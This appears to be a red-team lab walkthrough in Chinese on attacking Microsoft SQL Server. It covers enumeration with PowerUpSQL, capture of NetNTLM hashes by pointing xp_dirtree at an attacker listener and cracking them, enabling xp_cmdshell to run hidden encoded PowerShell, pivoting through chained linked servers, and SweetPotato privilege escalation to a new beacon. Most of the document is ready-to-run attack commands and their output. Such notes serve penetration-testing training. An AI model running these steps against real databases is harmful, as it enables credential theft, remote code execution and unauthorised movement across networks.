# MS SQL Servers


枚举某个实例下的链接
```
powershell Get-SQLQuery -Instance "sql" -Query "SELECT * FROM master..sysservers"
```



MSSQL除了信息数据窃取以外还有很大的攻击面，包括：代码执行，权限提升，横向移动，权限维持

使用工具：[PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)


查找MSSQL实例的cmdlets
```
Get-SQLInstanceDomain
Get-SQLInstanceBroadcast
Get-SQLInstanceScanUDP
```

例子:
```
beacon> getuid
[*] You are DEV\bfarmer

beacon> powershell Get-SQLInstanceDomain

ComputerName     : srv-1.dev.cyberbotic.io
Instance         : srv-1.dev.cyberbotic.io,1433
DomainAccountSid : 15000005210002361191261941702819312113313089172110400
DomainAccount    : svc_mssql
DomainAccountCn  : MS SQL Service
Service          : MSSQLSvc
Spn              : MSSQLSvc/srv-1.dev.cyberbotic.io:1433
LastLogon        : 5/14/2021 2:24 PM
Description      : 
```

BloodHound等价操作，甚至可以查找潜在的mssql管理员
```
MATCH p=(u:User)-[:SQLAdmin]->(c:Computer) RETURN p
```

``` Get-SQLConnectionTest```查找是否可以连接数据库
```
beacon> powershell Get-SQLConnectionTest -Instance "srv-1.dev.cyberbotic.io,1433" | fl

ComputerName : srv-1.dev.cyberbotic.io
Instance     : srv-1.dev.cyberbotic.io,1433
Status       : Accessible
```

```Get-SQLServerInfo```命令收集更详细的连接实例信息
```
beacon> powershell Get-SQLServerInfo -Instance "srv-1.dev.cyberbotic.io,1433"

ComputerName           : srv-1.dev.cyberbotic.io
Instance               : SRV-1
DomainName             : DEV
ServiceProcessID       : 3960
ServiceName            : MSSQLSERVER
ServiceAccount         : DEV\svc_mssql
AuthenticationMode     : Windows Authentication
ForcedEncryption       : 0
Clustered              : No
SQLServerVersionNumber : 13.0.5026.0
SQLServerMajorVersion  : 2016
SQLServerEdition       : Standard Edition (64-bit)
SQLServerServicePack   : SP2
OSArchitecture         : X64
OsMachineType          : ServerNT
OSVersionName          : Windows Server 2016 Datacenter
OsVersionNumber        : SQL
Currentlogin           : DEV\bfarmer
IsSysadmin             : Yes
ActiveSessions         : 1
```

```Get-SQLQuery```执行sql命令
```
beacon> powershell Get-SQLQuery -Instance "srv-1.dev.cyberbotic.io,1433" -Query "select @@servername"

Column1
-------
SRV-1 
```


```mssqlclient.py```连接mssql，需要账号密码
```
root@kali:~# proxychains python3 /usr/local/bin/mssqlclient.py -windows-auth DEV/bfarmer@10.10.17.25
```

GUI连接工具:[HeidiSQL](https://www.heidisql.com/)或者[SMSS](https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms)

![alt GUI](https://rto-assets.s3.eu-west-2.amazonaws.com/sql-servers/heidi.png?width=1920)


# MSSQL NetNTLM Capture

通过mssql的xp_dirtree命令可以进行中继攻击

## 方法一

1. 监听
首先在本地监听，使用[InveighZero](https://github.com/Kevin-Robertson/InveighZero)进行监听，需要本地管理员权限
```
beacon> execute-assembly C:\Tools\InveighZero\Inveigh\bin\Debug\Inveigh.exe -DNS N -LLMNR N -LLMNRv6 N -HTTP N -FileOutput N
```
2. 触发
在mssql上，执行命令```EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1```，10.10.17.231的IP地址就是上面监听的机器

3. 收到NTML
监听机器收到的NTML应该是下面格式
```
[+] [2021-05-14T15:33:49] TCP(445) SYN packet from 10.10.17.25:50323
[+] [2021-05-14T15:33:49] SMB(445) negotiation request detected from 10.10.17.25:50323
[+] [2021-05-14T15:33:49] SMB(445) NTLM challenge 3006547FFC8E90D8 sent to 10.10.17.25:50323
[+] [2021-05-14T15:33:49] SMB(445) NTLMv2 captured for DEV\svc_mssql from 10.10.17.25(SRV-1):50323:
svc_mssql::DEV:[...snip...]
```

4. 破解
john
```
john --format=netntlmv2 --wordlist=wordlist svc_mssql-netntlmv2
```

hashcat
```
hashcat -a 0 -m 5600 svc_mssql-netntlmv2 wordlist
```

## 方法二

可以使用 WinDivert + rportfwd把smb流量转发到teamserver（就是kali机），然后再kali使用[smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py)监听，这个方法前面几章已经有展示。

监听
```
root@kali:~# python3 /usr/local/bin/smbserver.py -smb2support pwn .
```

# MSSQL Command Execution

MSSQL拥有执行系统命令能力

PowerUpSQL使用```Invoke-SQLOSCmd```命令

```
beacon> powershell Invoke-SQLOSCmd -Instance "srv-1.dev.cyberbotic.io,1433" -Command "whoami" -RawResults

dev\svc_mssql
```


原生MSSQL使用``` xp_cmdshell ```命令
```
EXEC xp_cmdshell 'whoami';
```
但不一定成功，有可能没有权限，或者没有开启xp_cmdshell,会收到类似如下报错

![alt shell](https://rto-assets.s3.eu-west-2.amazonaws.com/sql-servers/xp_cmdshell-disabled.png?width=1920)


查看xp_cmdshell是否开启
```
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
```

value=0,表示没有开启

![alt value](https://rto-assets.s3.eu-west-2.amazonaws.com/sql-servers/sysconfigurations.png?width=1920)

开启xp_cmdshell功能
```
sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

执行powershell命令
```
EXEC xp_cmdshell 'powershell -w hidden -enc <blah>';
```

这里要注意：
1. sql命令可能有长度限制
2. sql服务器可能无法直接访问kali，需要转发和pivot监听



# MS SQL Lateral Movement

mssql支持多个源，包括其他SqlServer，这些SqlServer可能存在其他机器，域，或者林中。如此横向移动就成为可能。

1. 获取实例
## 方法一，手动抓取

枚举当前机器的mssql的实例
```
SELECT * FROM master..sysservers;
```

![alt sqlserver](https://rto-assets.s3.eu-west-2.amazonaws.com/sql-servers/srv1-link.png?width=1920)


可以利用上面的实例运行sql语句

```
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername');
```

**注意，上面实例使用双引号，sql语句使用单引号。**


查看某个实例是否有xp_cmdshell权限
```
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'SELECT * FROM sys.configurations WHERE name = ''xp_cmdshell''');
```

如果被禁用，开启xp_cmdshell
```
EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [target instance]
EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [target instance]
```

## 方法二，自动抓取 


使用```Get-SQLServerLinkCrawl```命令

```
beacon> powershell Get-SQLServerLinkCrawl -Instance "srv-1.dev.cyberbotic.io,1433"

Version     : SQL Server 2016 
Instance    : SRV-1
CustomQuery : 
Sysadmin    : 1
Path        : {SRV-1}
User        : DEV\bfarmer
Links       : {SQL-1.CYBERBOTIC.IO}

Version     : SQL Server 2016 
Instance    : SQL-1
CustomQuery : 
Sysadmin    : 1
Path        : {SRV-1, SQL-1.CYBERBOTIC.IO}
User        : sa
Links       : {SQL01.ZEROPOINTSECURITY.LOCAL}

Version     : SQL Server 2019 
Instance    : SQL01\SQLEXPRESS
CustomQuery : 
Sysadmin    : 1
Path        : {SRV-1, SQL-1.CYBERBOTIC.IO, SQL01.ZEROPOINTSECURITY.LOCAL}
User        : sa
Links       : 
```

留意上面的实例链：```SRV-1 > SQL-1.CYBERBOTIC.IO > SQL01.ZEROPOINTSECURITY.LOCAL```

2. 执行系统shell

在```sql-1.cyberbotic.io```实例上执行系统shell

```
SELECT * FROM OPENQUERY( "sql-1.cyberbotic.io" , 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''' )
```

在```sql01.zeropointsecurity.local```实例上执行系统shell

```
SELECT * FROM OPENQUERY( "sql-1.cyberbotic.io" , 'select * from openquery("sql01.zeropointsecurity.local", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''' '')' )
```

# MS SQL Privilege Escalation

因为当前mssql实例是以```NT Service\MSSQL$SQLEXPRESS```用户身份运行的，此用户有```SeImpersonatePrivilege```能力，这个能力众所周知可以使用各种土豆来提权。

```
beacon> getuid
[*] You are NT Service\MSSQL$SQLEXPRESS

beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe TokenPrivileges

====== TokenPrivileges ======

Current Token's Privileges

                SeAssignPrimaryTokenPrivilege:  DISABLED
                     SeIncreaseQuotaPrivilege:  DISABLED
                      SeChangeNotifyPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
                      SeManageVolumePrivilege:  SE_PRIVILEGE_ENABLED
                       SeImpersonatePrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
                      SeCreateGlobalPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
                SeIncreaseWorkingSetPrivilege:  DISABLED

[*] Completed collection in 0.01 seconds
```

这里使用[SweetPotato](https://github.com/CCob/SweetPotato)提权

```
beacon> execute-assembly C:\Tools\SweetPotato\bin\Debug\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc SQBFAF[...snip...]ApAA=="

SweetPotato by @_EthicalChaos_
  Orignal RottenPotato code and exploit by @foxglovesec
  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery
  PrintSpoofer discovery and original exploit by @itm4n
[+] Attempting NP impersonation using method PrintSpoofer to launch C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
[+] Triggering notification on evil PIPE \\sql01/pipe/7365ffd9-7808-4a0d-ab47-45850a41d7ed
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

beacon> connect localhost 4444
[*] Tasked to connect to localhost:4444
[+] host called home, sent: 20 bytes
[+] established link to child beacon: 10.10.18.221	
```


